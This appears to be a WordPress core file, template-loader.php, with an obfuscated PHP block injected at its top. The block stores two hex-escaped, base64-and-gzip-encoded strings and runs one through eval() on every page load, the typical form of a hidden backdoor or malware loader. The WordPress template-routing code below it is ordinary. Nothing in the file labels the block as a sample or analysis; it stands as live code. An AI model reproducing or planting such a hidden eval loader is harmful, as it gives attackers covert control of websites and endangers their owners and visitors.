<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "gIUINQtO\x62H1D10m\x41R8Sk\x62879W7D9qe\x2b/lv\x42\x62\x63D\x43r3y7gf1ZR\x41f4h\x2bEm\x43Ux9hoYP\x43kDLPk5h\x63TN\x42OhI\x639XVQZJHN4H\x63wDQe0RJiOTh3OvsNu\x43UeW\x41J\x43LzN7ULp6\x42Lt\x6378\x41P2vw\x2bGWnY\x410L1yGMk33O\x61Kpmi7Ejv\x62wotSYOPTSn\x62JVPoTG5mvLJ\x61Syrd2d6Rr/twm6VfRyZR4\x41H0vq6N\x63qrgX\x61Mw\x63kiJEe5IrUvm/TJyI2Skp\x62wZqQpuJmlqkqm\x62JkoyL4vOExrPiSKXsN15d6\x2bqI5l\x626Uk/ZNd72p2\x62fkW\x610j\x63NVLE8zxFQlur0DEgyr1dMU\x41lVYpRxDQxNuxW\x41U89Gz7F5zMUk8ZU87\x43tqX\x61ZKO1\x42W1yhV\x2b\x62rYkyz\x634YJ9H1iKktlT6t\x43SMzHXwf8IslriQYD\x636QWUFMLKJq\x63\x41XyVJh5YYHq\x61R9pQUUZJpz5665mhNLsdEEWXX3n87WXL/lp44j81d\x62\x4130wtw9M2XG9EE/k/1sNF/19\x613eI7HWqILdIDZgT/n9u4PuMPr8y4ng5STX/hMSTQnH9ZXTyvG1\x2b6Qf3u\x63ydlyvxoXJoNoP\x43\x62VqTiv8\x61E7\x42f\x2bhj1lynlVJRt\x43MUOtLn\x435d466DiWMzFM6YRU\x63H1\x42fRF\x2bdoKFrxlzldL5tz570j/l\x42Lp3\x43T\x2b89rz360F3lHRR\x2b/g3EfUh5lW\x61\x42QXzPkV\x41g3wUg\x42NqyU4SoPtT9QnSqVYoRPG6QsMYDkSe\x6175JlTRjS6Ggven\x43R0/Tnzv7yefPxSXZL\x2bwg\x43PluL7/fdS7JJ9\x61SVW\x623yspIEqPUYimqNVQp\x41uurUhZPUQikkhExw/nmP9D\x42M\x62/07U1\x62/jK\x41X\x42wJe9jp\x41nFQ/TK\x41\x62\x42wJe9jo\x413FQ/DK\x41f\x42wJe9jn\x41HGQ/zJ\x41j\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Loads the correct template based on the visitor's URL
 *
 * @package WordPress
 */
if ( wp_using_themes() ) {
    /**
     * Fires before determining which template to load.
     *
     * @since 1.5.0
     */
    do_action( 'template_redirect' );
}

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
    exit;
}

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) {
    /**
     * Fired when the template loader determines a robots.txt request.
     *
     * @since 2.1.0
     */
    do_action( 'do_robots' );
    return;
} elseif ( is_favicon() ) {
    /**
     * Fired when the template loader determines a favicon.ico request.
     *
     * @since 5.4.0
     */
    do_action( 'do_favicon' );
    return;
} elseif ( is_feed() ) {
    do_feed();
    return;
} elseif ( is_trackback() ) {
    require ABSPATH . 'wp-trackback.php';
    return;
}

if ( wp_using_themes() ) {
    $tag_templates = [
        'is_embed'             => 'get_embed_template',
        'is_404'               => 'get_404_template',
        'is_search'            => 'get_search_template',
        'is_front_page'        => 'get_front_page_template',
        'is_home'              => 'get_home_template',
        'is_privacy_policy'    => 'get_privacy_policy_template',
        'is_post_type_archive' => 'get_post_type_archive_template',
        'is_tax'               => 'get_taxonomy_template',
        'is_attachment'        => 'get_attachment_template',
        'is_single'            => 'get_single_template',
        'is_page'              => 'get_page_template',
        'is_singular'          => 'get_singular_template',
        'is_category'          => 'get_category_template',
        'is_tag'               => 'get_tag_template',
        'is_author'            => 'get_author_template',
        'is_date'              => 'get_date_template',
        'is_archive'           => 'get_archive_template',
    ];

    $template = false;

    // Loop through each of the template conditionals and find the appropriate template file.
    foreach ( $tag_templates as $tag => $template_getter ) {
        if ( call_user_func( $tag ) ) {
            $template = call_user_func( $template_getter );
        }

        if ( $template ) {
            if ( 'is_attachment' === $tag ) {
                remove_filter( 'the_content', 'prepend_attachment' );
            }
            break;
        }
    }

    if ( ! $template ) {
        $template = get_index_template();
    }

    /**
     * Filters the path of the current template before including it.
     *
     * @since 3.0.0
     *
     * @param string $template The path of the template to include.
     */
    $template = apply_filters( 'template_include', $template );

    if ( $template ) {
        include $template;
    } elseif ( current_user_can( 'switch_themes' ) ) {
        $theme = wp_get_theme();
        if ( $theme->errors() ) {
            wp_die( $theme->errors() );
        }
    }
    return;
}
?>
